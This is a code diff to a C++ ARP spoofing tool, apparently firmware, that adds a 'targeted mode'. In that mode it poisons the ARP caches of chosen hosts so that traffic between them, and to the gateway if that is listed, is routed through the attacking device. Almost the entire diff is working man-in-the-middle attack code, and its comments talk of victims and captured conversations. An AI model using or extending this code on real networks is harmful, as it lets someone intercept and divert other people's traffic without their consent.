@@ -42,6 +42,8 @@ bool ArpSpoofer::begin() {
   _netBase   = netH + 1;                    // skip the network address
   _hostCount = size - 1;                    // skip the broadcast address
   if (_hostCount > (uint32_t)MAX_TARGETS) _hostCount = MAX_TARGETS;
+  // Targeted mode: the sweep walks the explicit list instead of the subnet.
+  if (_explicitCount) _hostCount = _explicitCount;
 
   _sweepIdx  = 0;
   _sweepDone = false;
@@ -190,8 +192,8 @@ void ArpSpoofer::sweepStep() {
   if (!_running || _sweepDone) return;
 
   for (int i = 0; i < SWEEP_BATCH && _sweepIdx < _hostCount; i++, _sweepIdx++) {
-    const uint32_t ipH = _netBase + _sweepIdx;
-    const uint32_t ipN = htonl(ipH);
+    const uint32_t ipN = _explicitCount ? _explicit[_sweepIdx]
+                                        : htonl(_netBase + _sweepIdx);
     if (ipN == _selfIp) continue;      // no point asking about ourselves
 
     // "Who has <ip>? Tell <us>" — replies come back unicast and are picked up
@@ -200,6 +202,11 @@ void ArpSpoofer::sweepStep() {
   }
 
   if (_sweepIdx >= _hostCount) _sweepDone = true;
+}
+
+void ArpSpoofer::setTargets(const uint32_t* ipsNetworkOrder, uint8_t count) {
+  _explicitCount = count > MAX_EXPLICIT ? MAX_EXPLICIT : count;
+  for (uint8_t i = 0; i < _explicitCount; ++i) _explicit[i] = ipsNetworkOrder[i];
 }
 
 void ArpSpoofer::observe(const uint8_t* eth, uint16_t len) {
@@ -260,6 +267,11 @@ void ArpSpoofer::observe(const uint8_t* eth, uint16_t len) {
     // few unanswered ones. Queued for retry rather than sent twice back to
     // back — two frames into an exhausted TX pool are two frames lost.
     _sendArpReliable(2, senderMac, _selfMac, _selfMac, _gwIp, senderMac, senderIp);
+  } else if (_explicitCount && _isExplicit(targetIp) && targetIp != _selfIp) {
+    // Targeted mode: a host is looking for one of the listed peers — claim to
+    // be it. Without this, host-to-host poisoning dies on the first
+    // reachability probe and the conversation bypasses us.
+    _sendArpReliable(2, senderMac, _selfMac, _selfMac, targetIp, senderMac, senderIp);
   } else if (_gwKnown && senderIp == _gwIp && targetIp != _selfIp) {
     // The gateway is looking for a host — claim to be that host, so the return
     // path keeps flowing through us too. Same one-shot deal as above.
@@ -291,6 +303,12 @@ void ArpSpoofer::observeIpv4(const uint8_t* srcMac, uint32_t srcIp) {
   if (_gwKnown && memcmp(srcMac, _gwMac, 6) == 0) return;
   // Only local hosts can be poisoned.
   if ((ntohl(srcIp) & _maskH) != _netH) return;
+  // Targeted mode: never learn hosts outside the explicit list.
+  if (_explicitCount) {
+    bool listed = false;
+    for (uint8_t i = 0; i < _explicitCount; ++i) if (_explicit[i] == srcIp) { listed = true; break; }
+    if (!listed) return;
+  }
 
   _add(srcIp, srcMac);
 }
@@ -329,8 +347,51 @@ const ArpSpoofer::Target* ArpSpoofer::findByMac(const uint8_t* mac) const {
 
 // ── Poisoning ───────────────────────────────────────────────────────────────
 
+bool ArpSpoofer::_isExplicit(uint32_t ip) const {
+  for (uint8_t i = 0; i < _explicitCount; i++)
+    if (_explicit[i] == ip) return true;
+  return false;
+}
+
+void ArpSpoofer::_poisonPeers() {
+  // Each listed host is told every other listed host lives at our MAC, one
+  // pair per call so we do not burst into the TX pool. This is what makes
+  // host-to-host traffic flow through the relay. A pair where one side is the
+  // gateway is poisoned too (its MAC comes from _gwMac), which diverts the
+  // other target's internet traffic; that only happens when the user entered
+  // the gateway as a target.
+  const uint8_t pairs = _explicitCount * _explicitCount;
+  for (uint8_t tries = 0; tries < pairs; tries++) {
+    const uint8_t i = _peerIdx % _explicitCount;
+    const uint8_t j = (_peerIdx / _explicitCount) % _explicitCount;
+    _peerIdx++;
+    if (i == j) continue;
+    // Resolve each side's MAC: a normal target from the table, or the gateway
+    // from _gwMac (the sweep never adds the gateway as a Target).
+    const bool iGw = _explicit[i] == _gwIp, jGw = _explicit[j] == _gwIp;
+    const Target* ti = iGw ? nullptr : findByIp(_explicit[i]);
+    const Target* tj = jGw ? nullptr : findByIp(_explicit[j]);
+    if ((!ti && !iGw) || (!tj && !jGw)) continue;
+    if ((iGw || jGw) && !_gwKnown) continue;
+    const uint8_t* iMac = iGw ? _gwMac : ti->mac;
+    const uint8_t* jMac = jGw ? _gwMac : tj->mac;
+    const uint32_t iIp  = _explicit[i], jIp = _explicit[j];
+    // Tell i that j is at our MAC, and j that i is at our MAC.
+    _sendArp(2, iMac, _selfMac, _selfMac, jIp, iMac, iIp);
+    _sendArp(2, jMac, _selfMac, _selfMac, iIp, jMac, jIp);
+    break;
+  }
+}
+
 void ArpSpoofer::poisonStep() {
-  if (!_running || !_gwKnown) return;
+  if (!_running) return;
+
+  // Peer poisoning does not need the gateway. With two or more explicit
+  // targets this captures traffic between them even when neither is the
+  // gateway.
+  if (_explicitCount >= 2) _poisonPeers();
+
+  if (!_gwKnown) return;
 
   // Broadcast claim for the gateway address. This reaches every host on the
   // segment, including ones the sweep never found — phones in WiFi power save
@@ -340,10 +401,19 @@ void ArpSpoofer::poisonStep() {
   // through us.
   // Not every call: it recovers hosts that fell back to the real gateway, which
   // is worth doing regularly but not at the rate of the per-target frames.
-  if (++_poisonRound >= POISON_BCAST_EVERY) {
+  // Skipped in targeted mode: the broadcast would poison hosts that are not
+  // on the explicit list.
+  if (!_explicitCount && ++_poisonRound >= POISON_BCAST_EVERY) {
     _poisonRound = 0;
     _sendArp(2, kBroadcast, _selfMac, _selfMac, _gwIp, kZeroMac, _gwIp);
   }
+
+  // Targeted mode confines capture to traffic *between* the chosen hosts, so it
+  // does not poison each target against the gateway (that would divert all of
+  // their internet traffic). Exception: if the gateway is itself one of the
+  // targets, it is handled as an ordinary peer by _poisonPeers(), which then
+  // does divert that target's internet traffic — shown as Tn(G) in the UI.
+  if (_explicitCount) return;
 
   if (_count == 0) return;
 
@@ -388,6 +458,28 @@ void ArpSpoofer::restore() {
       _sendArp(2, t.mac, _selfMac, _gwMac, _gwIp, t.mac, t.ip);
       _sendArp(2, _gwMac, _selfMac, t.mac, t.ip, _gwMac, _gwIp);
       delay(2);
+    }
+  }
+
+  // Undo peer poisoning: tell each explicit target the real MAC of the others.
+  // Mirrors _poisonPeers(), including a pair where one side is the gateway (MAC
+  // from _gwMac) — otherwise that victim would keep pointing at us until its
+  // cache ages out, which can cut its internet for minutes.
+  if (_explicitCount >= 2) {
+    for (uint8_t i = 0; i < _explicitCount; i++) {
+      for (uint8_t j = 0; j < _explicitCount; j++) {
+        if (i == j) continue;
+        const bool iGw = _explicit[i] == _gwIp, jGw = _explicit[j] == _gwIp;
+        const Target* ti = iGw ? nullptr : findByIp(_explicit[i]);
+        const Target* tj = jGw ? nullptr : findByIp(_explicit[j]);
+        if ((!ti && !iGw) || (!tj && !jGw)) continue;
+        if ((iGw || jGw) && !_gwKnown) continue;
+        const uint8_t* iMac = iGw ? _gwMac : ti->mac;
+        const uint8_t* jMac = jGw ? _gwMac : tj->mac;
+        // Tell i the real MAC of j (sender = j's true MAC).
+        _sendArp(2, iMac, _selfMac, jMac, _explicit[j], iMac, _explicit[i]);
+        delay(2);
+      }
     }
   }
 }
